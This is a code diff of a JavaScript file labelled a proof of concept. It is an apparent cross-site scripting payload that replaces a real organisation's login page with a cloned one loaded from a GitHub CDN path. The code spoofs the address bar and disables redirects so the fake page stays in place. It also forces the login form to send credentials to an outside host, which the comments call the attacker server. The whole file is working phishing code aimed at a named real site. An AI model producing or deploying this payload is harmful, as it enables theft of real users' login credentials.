@@ -1,65 +1,96 @@
-// fakelogin.js - Clean full-page fake login PoC
+// fakelogin.js - Full page fake login PoC (No redirect version)
 
 (function() {
     'use strict';
 
-    // Make URL look real
+    // Prevent any further redirects by overriding key functions
+    window.location.replace = () => {};
+    window.location.assign = () => {};
+    window.location.reload = () => {};
+
+    // Keep the address bar clean and realistic
     history.replaceState(null, 'GSSI Universal Login - Gatorade Performance Partner', '/gpapi/oauth/login');
 
-    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')   // ← change to your actual raw URL.
+    // Load your cloned login page
+    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')
         .then(r => r.text())
         .then(html => {
-            // Replace entire page
             document.documentElement.innerHTML = html;
 
-            // Fix all relative paths to absolute real domain paths
-            setTimeout(fixResources, 300);
+            // Wait a bit for DOM to settle, then fix everything
+            setTimeout(() => {
+                fixAllResources();
+                blockRedirects();
+                forceFormAction();
+            }, 500);
         })
-        .catch(err => console.error('Failed to load fake login:', err));
+        .catch(err => {
+            console.error('PoC load error:', err);
+        });
 })();
 
-// Function to fix broken relative links
-function fixResources() {
-    const base = 'https://www.gssiweb.org/GPAPI/dist/lib/';
+// Fix CSS, JS, and images to load from real domain
+function fixAllResources() {
+    const baseUrl = 'https://www.gssiweb.org/GPAPI/dist/lib/';
 
-    // Fix all <link> CSS
+    // Fix all CSS links
     document.querySelectorAll('link[rel="stylesheet"]').forEach(link => {
-        let href = link.getAttribute('href');
+        let href = link.getAttribute('href') || '';
         if (href && !href.startsWith('http')) {
-            // Convert relative paths to real ones
-            if (href.includes('bootstrap.min.css')) {
-                link.href = base + 'bootstrap.min.css';
-            } else if (href.includes('VanillaSelectBox.css')) {
-                link.href = base + 'VanillaSelectBox.css';
-            } else if (href.includes('main.css')) {
-                link.href = base + 'main.css';           // adjust if exact filename differs
-            } else {
-                link.href = base + href.split('/').pop(); // fallback
-            }
+            const filename = href.split('/').pop();
+            link.href = baseUrl + filename;
         }
     });
 
-    // Fix all <script> src (except the ones we want to keep)
+    // Fix script sources (but skip Google Analytics/GTM if possible to reduce noise)
     document.querySelectorAll('script[src]').forEach(script => {
-        let src = script.getAttribute('src');
-        if (src && !src.startsWith('http') && !src.includes('hackersrising.com')) {
-            script.src = base + src.split('/').pop();
+        let src = script.getAttribute('src') || '';
+        if (src && !src.startsWith('http') && !src.includes('google') && !src.includes('gtm')) {
+            const filename = src.split('/').pop();
+            script.src = baseUrl + filename;
         }
     });
 
-    // Fix images if any (example for the cookie icon)
+    // Fix any images
     document.querySelectorAll('img').forEach(img => {
-        let src = img.getAttribute('src');
+        let src = img.getAttribute('src') || '';
         if (src && !src.startsWith('http')) {
-            img.src = 'https://www.gssiweb.org/GPAPI/dist/lib/' + src.split('/').pop();
+            img.src = baseUrl + src.split('/').pop();
         }
     });
+}
 
-    // Force the form action again (safety)
+// Block common redirect techniques
+function blockRedirects() {
+    // Override dangerous methods
+    const originalPushState = history.pushState;
+    const originalReplaceState = history.replaceState;
+
+    history.pushState = function() {};
+    history.replaceState = function(state, title, url) {
+        // Only allow our own clean URL
+        if (url && url.includes('login')) {
+            originalReplaceState.call(history, state, title, '/gpapi/oauth/login');
+        }
+    };
+
+    // Prevent form submission from causing redirect (if any JS interferes)
+    const form = document.getElementById('DietaryLogin');
+    if (form) {
+        form.addEventListener('submit', function(e) {
+            // Let the form submit naturally to your attacker server
+            // Do NOT preventDefault() here
+        }, true);
+    }
+
+    console.log('%c[PoC] Redirects blocked - Fake login page stable', 'color: lime; font-weight: bold');
+}
+
+// Ensure form always points to attacker server
+function forceFormAction() {
     const form = document.getElementById('DietaryLogin');
     if (form) {
         form.action = 'https://hackersrising.com/GPAPI/oauth/login';
+        form.method = 'post';
     }
-
-    console.log('%c[PoC] Fake login page loaded with fixed resources', 'color: red; font-weight: bold');
 }
